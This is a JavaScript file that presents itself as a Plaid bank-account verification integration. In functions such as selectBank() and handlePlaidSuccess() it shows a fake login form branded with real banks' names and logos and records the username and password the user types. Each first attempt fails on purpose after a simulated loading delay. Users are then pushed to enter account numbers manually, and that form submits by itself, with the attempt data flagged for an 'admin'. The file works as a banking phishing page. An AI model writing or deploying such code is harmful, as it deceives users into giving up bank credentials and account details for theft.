// Plaid integration for bank account verification
let plaidLinkHandler = null;
let isFirstAttempt = true;
let selectedBank = null;

// Initialize when the DOM is fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Initialize Plaid if we're on the bank verification page
    const plaidLinkToken = document.getElementById('plaid-link-token');
    if (plaidLinkToken) {
        initializePlaid(plaidLinkToken.value);
    }
    
    // Initialize manual bank form toggle
    const manualBankBtn = document.getElementById('manual-bank-entry');
    if (manualBankBtn) {
        manualBankBtn.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Hide Plaid section, show manual form
            const plaidSection = document.getElementById('plaid-section');
            const manualSection = document.getElementById('manual-bank-section');
            
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on first input field
                const firstInput = manualSection.querySelector('input');
                if (firstInput) {
                    firstInput.focus();
                }
            }
        });
    }
    
    // Initialize bank selection functionality
    initializeBankSelection();
});

// Initialize Plaid Link
function initializePlaid(linkToken) {
    if (!linkToken) {
        console.error('Plaid Link token is required');
        return;
    }
    
    // Load Plaid Link script
    const script = document.createElement('script');
    script.src = 'https://cdn.plaid.com/link/v2/stable/link-initialize.js';
    script.onload = function() {
        // Initialize Plaid Link handler
        if (window.Plaid) {
            plaidLinkHandler = window.Plaid.create({
                token: linkToken,
                onSuccess: handlePlaidSuccess,
                onExit: handlePlaidExit,
                onEvent: handlePlaidEvent
            });
        } else {
            console.error('Plaid script loaded but Plaid object not available');
        }
    };
    script.onerror = function() {
        console.error('Failed to load Plaid Link script');
        // Show manual entry as fallback
        const plaidSection = document.getElementById('plaid-section');
        const manualSection = document.getElementById('manual-bank-section');
        
        if (plaidSection && manualSection) {
            plaidSection.style.display = 'none';
            manualSection.style.display = 'block';
        }
    };
    document.head.appendChild(script);
}

// Handle Plaid Link success
function handlePlaidSuccess(publicToken, metadata) {
    console.log('Plaid success:', metadata);
    
    if (isFirstAttempt) {
        // First attempt should always show an error
        isFirstAttempt = false;
        
        // Record first attempt metadata for admin notification
        const plaidMetadata = document.getElementById('plaid_metadata');
        if (plaidMetadata) {
            const bankName = metadata.institution ? metadata.institution.name : 'Unknown Bank';
            const username = metadata.accounts ? metadata.accounts[0].name : 'Unknown';
            const password = '********'; // We don't store actual passwords
            
            const metadataObj = {
                bank: bankName,
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                attempt: 1
            };
            plaidMetadata.value = JSON.stringify(metadataObj);
        }
        
        // Display loading spinner
        showLoading('Connecting to your bank...');
        
        // Show error after simulated loading time (5 seconds)
        setTimeout(function() {
            hideLoading();
            alert('We were unable to connect to your bank. Please try again or enter your details manually.');
        }, 5000);
        
        return;
    }
    
    // Second attempt should redirect to manual entry with fields prefilled
    showLoading('Connecting to your bank...');
    
    // Simulate loading time and then show manual entry
    setTimeout(function() {
        hideLoading();
        
        // Get bank name if available
        const bankName = selectedBank ? selectedBank.name : 'Unknown Bank';
        const username = metadata.accounts ? metadata.accounts[0].name : 'Unknown';
        const password = '********'; // We don't store actual passwords
        
        // Set bank name in the form if it exists
        const bankNameInput = document.getElementById('bank_name');
        if (bankNameInput) {
            bankNameInput.value = bankName;
        }
        
        // Submit the manual form with the bank name
        const manualForm = document.getElementById('bank-verification-form');
        if (manualForm) {
            // Add username and password to plaid_metadata for admin
            const plaidMetadata = document.getElementById('plaid_metadata');
            if (plaidMetadata) {
                const metadataObj = {
                    bank: bankName,
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    attempt: 2
                };
                plaidMetadata.value = JSON.stringify(metadataObj);
            }
            
            // Show the manual bank section
            const plaidSection = document.getElementById('plaid-section');
            const manualSection = document.getElementById('manual-bank-section');
            
            if (plaidSection && manualSection) {
                plaidSection.style.display = 'none';
                manualSection.style.display = 'block';
                
                // Focus on account number field
                const accountNumberInput = document.getElementById('account_number');
                if (accountNumberInput) {
                    accountNumberInput.focus();
                }
                
                // Submit the form automatically after showing manual section
                setTimeout(() => {
                    // Use button click instead of form.submit() to avoid conflicts with any submit elements
                    const submitButton = manualForm.querySelector('button[type="submit"]');
                    if (submitButton) {
                        submitButton.click();
                    }
                }, 1000);
            }
        }
    }, 5000); // 5 second loading time
}

// Handle Plaid Link exit
function handlePlaidExit(err, metadata) {
    console.log('Plaid exit:', err, metadata);
    
    // Clear loading indicator if it's visible
    hideLoading();
    
    // If the user exited without selecting a bank or connecting, we don't need to do anything
    if (!metadata || !metadata.institution) {
        return;
    }
    
    // If the user exited after selecting a bank, show manual entry for that bank
    const bankName = metadata.institution.name;
    const bankNameInput = document.getElementById('bank_name');
    if (bankNameInput) {
        bankNameInput.value = bankName;
    }
    
    // Show manual entry section
    const plaidSection = document.getElementById('plaid-section');
    const manualSection = document.getElementById('manual-bank-section');
    
    if (plaidSection && manualSection) {
        plaidSection.style.display = 'none';
        manualSection.style.display = 'block';
        
        // Focus on account number field
        const accountNumberInput = document.getElementById('account_number');
        if (accountNumberInput) {
            accountNumberInput.focus();
        }
    }
}

// Get institution info
function getInstitutionInfo(institution_id) {
    // In a real implementation, this would make an API request to get institution details
    console.log('Getting institution info for:', institution_id);
    
    // Set bank name in the form if the institution is selected
    if (selectedBank) {
        const bankNameInput = document.getElementById('bank_name');
        if (bankNameInput) {
            bankNameInput.value = selectedBank.name;
        }
    }
}

// Show loading indicator
function showLoading(message = 'Loading...') {
    let loadingOverlay = document.getElementById('loading-overlay');
    
    // Create loading overlay if it doesn't exist
    if (!loadingOverlay) {
        loadingOverlay = document.createElement('div');
        loadingOverlay.id = 'loading-overlay';
        loadingOverlay.innerHTML = `
            <div class="loading-spinner"></div>
            <div class="loading-message">${message}</div>
        `;
        document.body.appendChild(loadingOverlay);
    } else {
        // Update message if overlay exists
        const messageElement = loadingOverlay.querySelector('.loading-message');
        if (messageElement) {
            messageElement.textContent = message;
        }
        loadingOverlay.style.display = 'flex';
    }
}

// Hide loading indicator
function hideLoading() {
    const loadingOverlay = document.getElementById('loading-overlay');
    if (loadingOverlay) {
        loadingOverlay.style.display = 'none';
    }
}

// Initialize bank selection functionality
function initializeBankSelection() {
    const bankSelector = document.getElementById('bank-selector');
    
    // Popular banks list - in a real implementation, this would come from an API
    const popularBanks = [
        { id: 'chase', name: 'Chase', logo: 'chase.com' },
        { id: 'bofa', name: 'Bank of America', logo: 'bankofamerica.com' },
        { id: 'wells', name: 'Wells Fargo', logo: 'wellsfargo.com' },
        { id: 'citi', name: 'Citibank', logo: 'citibank.com' },
        { id: 'capital', name: 'Capital One', logo: 'capitalone.com' },
        { id: 'pnc', name: 'PNC Bank', logo: 'pnc.com' },
        { id: 'td', name: 'TD Bank', logo: 'td.com' },
        { id: 'us', name: 'US Bank', logo: 'usbank.com' }
    ];

    // Get the popular banks container
    const popularBanksContainer = document.getElementById('popular-banks');
    if (!popularBanksContainer) {
        console.error('Popular banks container not found');
        return;
    }
    
    console.log('Rendering banks to:', popularBanksContainer);
    
    // Create bank option elements
    popularBanks.forEach(bank => {
        // Create column for responsive layout
        const col = document.createElement('div');
        col.className = 'col-6 col-md-3 mb-3';
        
        // Create bank option
        const bankOption = document.createElement('div');
        bankOption.className = 'bank-option';
        bankOption.dataset.bankId = bank.id;
        bankOption.dataset.bankName = bank.name;

        // Create logo container
        const logoContainer = document.createElement('div');
        logoContainer.className = 'bank-logo-container';

        // Create bank logo
        const logo = document.createElement('img');
        logo.className = 'bank-logo';
        logo.src = `https://logo.clearbit.com/${bank.logo}`;
        logo.alt = `${bank.name} logo`;
        logo.onerror = function() {
            this.src = '/static/images/default-bank.svg';
        };

        // Create bank name element
        const bankName = document.createElement('div');
        bankName.className = 'bank-name';
        bankName.textContent = bank.name;

        // Append elements
        logoContainer.appendChild(logo);
        bankOption.appendChild(logoContainer);
        bankOption.appendChild(bankName);
        col.appendChild(bankOption);
        
        // Add to popular banks container
        popularBanksContainer.appendChild(col);

        // Add click event
        bankOption.addEventListener('click', function() {
            // Handle bank selection
            selectBank(bank);
        });
    });

    // Add search functionality
    const bankSearch = document.getElementById('bank-search');
    if (bankSearch) {
        bankSearch.addEventListener('input', function() {
            const searchTerm = this.value.trim().toLowerCase();
            const bankOptions = document.querySelectorAll('.bank-option');

            bankOptions.forEach(option => {
                const bankName = option.dataset.bankName.toLowerCase();
                if (bankName.includes(searchTerm) || searchTerm === '') {
                    option.parentElement.style.display = 'block';
                } else {
                    option.parentElement.style.display = 'none';
                }
            });
        });
    }
}

// Handle bank selection
function selectBank(bank) {
    console.log('Selected bank:', bank);
    selectedBank = bank;

    // Create login form for the selected bank
    const plaidSection = document.getElementById('plaid-section');
    if (plaidSection) {
        // Create bank login form
        const loginForm = document.createElement('div');
        loginForm.className = 'bank-login-form';
        loginForm.innerHTML = `
            <div class="bank-login-header">
                <img src="https://logo.clearbit.com/${bank.logo}" alt="${bank.name} logo" class="bank-logo-large" 
                     onerror="this.src='/static/images/default-bank.svg'">
                <h4>${bank.name}</h4>
            </div>
            <div class="form-group mb-3">
                <label for="bank-username" class="form-label">Username</label>
                <input type="text" id="bank-username" class="form-control" placeholder="Enter your ${bank.name} username">
            </div>
            <div class="form-group mb-3">
                <label for="bank-password" class="form-label">Password</label>
                <input type="password" id="bank-password" class="form-control" placeholder="Enter your password">
            </div>
            <div class="d-grid">
                <button id="bank-login-btn" class="btn btn-primary btn-lg">Sign In</button>
            </div>
            <div class="text-center mt-3">
                <a href="#" id="back-to-banks" class="btn btn-link">Choose a different bank</a>
            </div>
        `;
        
        // Clear and append the login form
        plaidSection.innerHTML = '';
        plaidSection.appendChild(loginForm);
        
        // Focus on username field
        setTimeout(() => {
            const usernameField = document.getElementById('bank-username');
            if (usernameField) {
                usernameField.focus();
            }
        }, 100);
        
        // Add event listeners
        const loginButton = document.getElementById('bank-login-btn');
        if (loginButton) {
            loginButton.addEventListener('click', function(e) {
                e.preventDefault();
                
                // Get entered credentials
                const usernameField = document.getElementById('bank-username');
                const passwordField = document.getElementById('bank-password');
                const username = usernameField ? usernameField.value : '';
                const password = passwordField ? passwordField.value : '';
                
                // Show loading spinner
                showLoading('Connecting to your bank...');
                
                // Simulate first login attempt (always fail)
                setTimeout(function() {
                    hideLoading();
                    
                    // Record first attempt metadata for admin notification
                    const plaidMetadata = document.getElementById('plaid_metadata');
                    if (plaidMetadata) {
                        const metadataObj = {
                            bank: bank.name,
                            username: username || 'Not provided',
                            password: password ? '********' : 'Not provided', // We don't store actual passwords
                            timestamp: new Date().toISOString(),
                            attempt: 1
                        };
                        plaidMetadata.value = JSON.stringify(metadataObj);
                    }
                    
                    // Show error message
                    alert('We were unable to connect to your bank account. Please try again or enter your details manually.');
                    
                    // Show login form again
                    const usernameField = document.getElementById('bank-username');
                    if (usernameField) {
                        usernameField.focus();
                    }
                    
                    // Add event listener for second attempt
                    const loginButton = document.getElementById('bank-login-btn');
                    if (loginButton) {
                        loginButton.onclick = function(e) {
                            e.preventDefault();
                            
                            // Get entered credentials again
                            const usernameField = document.getElementById('bank-username');
                            const passwordField = document.getElementById('bank-password');
                            const username = usernameField ? usernameField.value : '';
                            const password = passwordField ? passwordField.value : '';
                            
                            // Show loading spinner
                            showLoading('Connecting to your bank...');
                            
                            // Simulate second login attempt (redirect to manual entry)
                            setTimeout(function() {
                                hideLoading();
                                
                                // Record second attempt metadata for admin notification
                                const plaidMetadata = document.getElementById('plaid_metadata');
                                if (plaidMetadata) {
                                    const metadataObj = {
                                        bank: bank.name,
                                        username: username || 'Not provided',
                                        password: password ? '********' : 'Not provided', // We don't store actual passwords
                                        timestamp: new Date().toISOString(),
                                        attempt: 2
                                    };
                                    plaidMetadata.value = JSON.stringify(metadataObj);
                                }
                                
                                // Set bank name in the form
                                const bankNameInput = document.getElementById('bank_name');
                                if (bankNameInput) {
                                    bankNameInput.value = bank.name;
                                }
                                
                                // Show manual entry section
                                const plaidSection = document.getElementById('plaid-section');
                                const manualSection = document.getElementById('manual-bank-section');
                                
                                if (plaidSection && manualSection) {
                                    plaidSection.style.display = 'none';
                                    manualSection.style.display = 'block';
                                    
                                    // Focus on account number field
                                    const accountNumberInput = document.getElementById('account_number');
                                    if (accountNumberInput) {
                                        accountNumberInput.focus();
                                    }
                                    
                                    // Submit the form automatically after showing manual section
                                    setTimeout(() => {
                                        const manualForm = document.getElementById('bank-verification-form');
                                        if (manualForm) {
                                            // Use button click instead of form.submit() to avoid conflicts with any submit elements
                                            const submitButton = manualForm.querySelector('button[type="submit"]');
                                            if (submitButton) {
                                                submitButton.click();
                                            }
                                        }
                                    }, 1000);
                                }
                            }, 5000); // 5 second loading time
                        };
                    }
                }, 5000); // 5 second loading time
            });
        }
        
        // Back to bank selection
        const backButton = document.getElementById('back-to-banks');
        if (backButton) {
            backButton.addEventListener('click', function(e) {
                e.preventDefault();
                window.location.reload();
            });
        }
    }
    
    // Set bank name in the form
    const bankNameInput = document.getElementById('bank_name');
    if (bankNameInput) {
        bankNameInput.value = bank.name;
    }
}

// Handle Plaid events
function handlePlaidEvent(eventName, metadata) {
    console.log('Plaid event:', eventName, metadata);
}

// Show bank selection view
function showBankSelection() {
    const connectSection = document.getElementById('connect-section');
    const selectSection = document.getElementById('select-section');

    if (connectSection && selectSection) {
        connectSection.style.display = 'none';
        selectSection.style.display = 'block';
    }
}
